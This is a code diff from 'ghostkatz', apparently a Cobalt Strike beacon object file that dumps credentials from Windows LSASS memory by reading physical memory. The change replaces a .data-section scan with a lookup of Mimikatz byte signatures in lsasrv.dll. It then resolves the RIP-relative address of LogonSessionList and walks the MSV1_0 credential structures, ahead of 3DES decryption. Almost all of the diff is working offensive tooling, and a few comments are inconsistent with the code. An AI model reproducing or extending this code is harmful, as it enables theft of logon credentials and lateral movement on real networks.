@@ -3,17 +3,18 @@
 
 #include "ghostkatz.h"
 #include "defs.h"
+#include "lsass_offsets.h"
 
 BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress, DWORD64* FirstEntryInList)
 {
-    // Check if right side is valid
+    // Check if left side is valid
     DWORD64 FlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead);
     if (FlinkVA > 0 && FlinkVA < ImageStartAddress)
     {
         DWORD64 tmpPA = 0;
         if (TranslateUVA2Physical(FlinkVA, &tmpPA, lower32bits, LsassPID))
         {
-            // Check Right Side is Valid
+            // Check right Side is Valid
             DWORD64 BlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead + 0x8);
             if (BlinkVA > 0 && BlinkVA < ImageStartAddress)
             {
@@ -30,76 +31,150 @@ BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPI
     return FALSE;
 }
 
-DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 BasePagePAtoSearch, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
+
+DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 PAToSearch, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
 {
-    DWORD64 PAtoRead = BasePagePAtoSearch;
-    while (PAtoRead < (BasePagePAtoSearch + 0x1000 - 0x10))
+    DWORD64 PAtoRead = PAToSearch;
+    DWORD64 FirstEntryInList = 0;
+    if (IsEntryValid(hFile, PAtoRead, lower32bits, LsassPID, ImageStartAddress, &FirstEntryInList))
     {
-        DWORD64 FirstEntryInList = 0;
-        if (IsEntryValid(hFile, PAtoRead, lower32bits, LsassPID, ImageStartAddress, &FirstEntryInList))
+        // Time to search for Primary String to see if LogonSessionList is valid:
+        // .process /p /r ffffdb8aeee52140; db poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28
+
+        // poi(lsasrv!LogonSessionList) = FirstEntryInList
+        //VERBOSE_PRINT("\t-> Potential LogonSessionList was found at PA=0x%llx\n", PAtoRead);
+
+        // poi(poi(lsasrv!LogonSessionList)+0x108)
+        DWORD64 credentialsStructureVPointer = FirstEntryInList + 0x108;
+        DWORD64 credentialsStructurePPointer = 0;
+        if (TranslateUVA2Physical(credentialsStructureVPointer, &credentialsStructurePPointer, lower32bits, LsassPID))
         {
-            // Time to search for Primary String to see if LogonSessionList is valid:
-            // .process /p /r ffffdb8aeee52140; db poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28
+            DWORD64 credentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePPointer);
+            //VERBOSE_PRINT("\t\t-> Potential PKIWI_MSV1_0_CREDENTIALS structure identified 0x%llx\n", credentialsStructureVPointer);
 
-            // poi(lsasrv!LogonSessionList) = FirstEntryInList
-            //VERBOSE_PRINT("\t-> Potential LogonSessionList was found at PA=0x%llx\n", PAtoRead);
-
-            // poi(poi(lsasrv!LogonSessionList)+0x108)
-            DWORD64 credentialsStructureVPointer = FirstEntryInList + 0x108;
-            DWORD64 credentialsStructurePPointer = 0;
-            if (TranslateUVA2Physical(credentialsStructureVPointer, &credentialsStructurePPointer, lower32bits, LsassPID))
+            // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)
+            DWORD64 credentialsStructurePA = 0;
+            if (TranslateUVA2Physical(credentialsStructureVA, &credentialsStructurePA, lower32bits, LsassPID))
             {
-                DWORD64 credentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePPointer);
-                //VERBOSE_PRINT("\t\t-> Potential PKIWI_MSV1_0_CREDENTIALS structure identified 0x%llx\n", credentialsStructureVPointer);
+                DWORD64 primaryCredentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePA + 0x10);
+                //VERBOSE_PRINT("\t\t\t-> Potential PKIWI_MSV1_0_PRIMARY_CREDENTIALS structure identified 0x%llx\n", primaryCredentialsStructureVA);
 
-                // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)
-                DWORD64 credentialsStructurePA = 0;
-                if (TranslateUVA2Physical(credentialsStructureVA, &credentialsStructurePA, lower32bits, LsassPID))
+                DWORD64 primaryCredentialsStructurePA = 0;
+                if (TranslateUVA2Physical(primaryCredentialsStructureVA, &primaryCredentialsStructurePA, lower32bits, LsassPID))
                 {
-                    DWORD64 primaryCredentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePA + 0x10);
-                    //VERBOSE_PRINT("\t\t\t-> Potential PKIWI_MSV1_0_PRIMARY_CREDENTIALS structure identified 0x%llx\n", primaryCredentialsStructureVA);
-
-                    DWORD64 primaryCredentialsStructurePA = 0;
-                    if (TranslateUVA2Physical(primaryCredentialsStructureVA, &primaryCredentialsStructurePA, lower32bits, LsassPID))
+                    // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28
+                    unsigned char* PrimaryStringCheck = ReadMultipleBytes(hFile, 8, primaryCredentialsStructurePA + 0x28, TRUE);
+                    if (memcmp(PrimaryStringCheck, "Primary", 8) == 0)
                     {
-                        // poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x28
-                        unsigned char* PrimaryStringCheck = ReadMultipleBytes(hFile, 8, primaryCredentialsStructurePA + 0x28, TRUE);
-                        if (memcmp(PrimaryStringCheck, "Primary", 8) == 0)
-                        {
-                            DWORD64 PointerToLogonSessionList = 0;
-                            TranslateP2V(PAtoRead, &PointerToLogonSessionList);
-                            return PointerToLogonSessionList;
-                        }
+                        DWORD64 PointerToLogonSessionList = 0;
+                        TranslateP2V(PAtoRead, &PointerToLogonSessionList);
+                        return PointerToLogonSessionList;
                     }
                 }
             }
-
         }
 
-        PAtoRead += 0x10;
     }
+
     return 0;
 }
 
-DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress)
+DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD dBuildNumber, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
 {
-    DWORD64 BasePageVA = DataSectionBase;
+    unsigned char* LogonSessionListSig = NULL;
+    int SigSize = 0;
+    int LogonSessionList_OFFSET = 0;
 
-    // Check through the pages in .data section and look for potentially valid LIST_ENTRY structures
-    DWORD64 LogonSessionListHead = 0;
-    do
+    //
+    // Get the correct Mimikatz byte sequences and offsets based on version
+    //
+    int i = 0;
+    for (i = 0; i < 12; i++) 
     {
-        DWORD64 BasePagePA = 0;
-        TranslateUVA2Physical(BasePageVA, &BasePagePA, lower32bits, LsassPID);
+        if ( (dBuildNumber >= LsassLogonSessionListArray[i].WindowsVersion) && (dBuildNumber < LsassLogonSessionListArray[i+1].WindowsVersion) )
+        {
+            LogonSessionListSig = LsassLogonSessionListArray[i].LogonSessionListSig;
+            SigSize = LsassLogonSessionListArray[i].SigSize;
+            LogonSessionList_OFFSET = LsassLogonSessionListArray[i].LogonSessionList_OFFSET;
 
-        LogonSessionListHead = IsValidLogonSessionListHead(hFile, BasePagePA, lower32bits, LsassPID, ImageStartAddress);
+            break;
+        }
+    }
 
-        BasePageVA += 0x1000;
+    if (LogonSessionListSig == NULL || SigSize == 0 || LogonSessionList_OFFSET == 0)
+    {
+        BeaconFormatPrintf(&outputbuffer, "Failed to get correct SecondLogonSessionList offsets for the Windows version!\n");
+        return 0;
+    }
 
-    } while (LogonSessionListHead == 0 && BasePageVA < DataSectionBase + 0x10000);
+    //
+    // After getting bytes and offsets, we will then check if we can find the pattern
+    //
+    PBYTE lsasrvImageBase = (PBYTE)GetModuleHandleA("lsasrv.dll");
+    if (lsasrvImageBase == NULL)
+    {
+        BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!\n");
+        return 0;
+    }
 
-    return LogonSessionListHead;
+    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lsasrvImageBase;
+    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
+    PBYTE lsasrvTextBase = lsasrvImageBase + pNtHdr->OptionalHeader.BaseOfCode;
+    DWORD lsasrvTextSize = pNtHdr->OptionalHeader.SizeOfCode;
+
+    //
+    // Search for l_LogSessList signature within wdigest.dll and grab the offset
+    //
+    DWORD LogonSessionListSigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, LogonSessionListSig, SigSize);
+    if (LogonSessionListSigOffset == 0) {
+        BeaconFormatPrintf(&outputbuffer, "Could not find offset to LogonSessionList\n");
+        return 0;
+    }
+
+    //
+    // If we found the pattern we can proceed with getting the actual address
+    //
+
+    /* Get the full address where the mimikatz byte pattern was found */
+    PBYTE LogonSessionList_PatternAddress = lsasrvTextBase + LogonSessionListSigOffset + LogonSessionList_OFFSET;
+
+    /*
+        Now get the RIP offset from the pattern address so we can use it later.
+        It may look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
+        The mimikatz offsets take us directly to the rip offset value we want to retrieve so we have to read 4 bytes forward and reverse the endianness
+    */
+    DWORD LogonSessionList_RipOffset =
+        (LogonSessionList_PatternAddress[3] << 24) |
+        (LogonSessionList_PatternAddress[2] << 16) |
+        (LogonSessionList_PatternAddress[1] << 8) |
+        (LogonSessionList_PatternAddress[0]);
+
+    /*
+        RIP-relative offsets are calculated from the instruction *following* the offset.
+        Mimikatz resolves the address 4 bytes too early (pointing directly at the offset),
+        so we must add 4 bytes to correct the final address.
+    */
+    DWORD64 Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + 4;
+    DWORD64 LogonSessionListPA = 0;
+    if (!TranslateUVA2Physical(Real_LogonSessionList_Address, &LogonSessionListPA, lower32bits, LsassPID))
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to transate LogonSessionList VA to PA!\n");
+        return 0;
+    }
+
+    //
+    // Validate the obtained address with IsValidLogonSessionList
+    //
+    Real_LogonSessionList_Address = IsValidLogonSessionListHead(hFile, LogonSessionListPA, lower32bits, LsassPID, ImageStartAddress);
+    if (Real_LogonSessionList_Address == 0)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Could not validate LogonSessionList!\n");
+    }
+
+    return Real_LogonSessionList_Address;
 }
+
+
 
 BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
 {
